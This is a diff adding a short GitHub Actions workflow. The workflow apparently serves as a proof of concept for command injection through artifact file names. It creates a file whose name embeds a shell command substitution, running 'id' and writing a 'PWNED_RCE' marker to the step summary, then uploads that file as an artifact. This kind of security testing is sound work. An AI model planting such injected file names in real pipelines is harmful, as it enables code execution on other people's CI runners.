@@ -1,0 +1,25 @@
+name: Test
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build artifact with attacker-controlled file name
+        run: |
+          mkdir -p content
+          cd content
+          touch 'rce$(id>&2;echo${IFS}PWNED_RCE>>$GITHUB_STEP_SUMMARY).txt'
+          ls -la
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: content
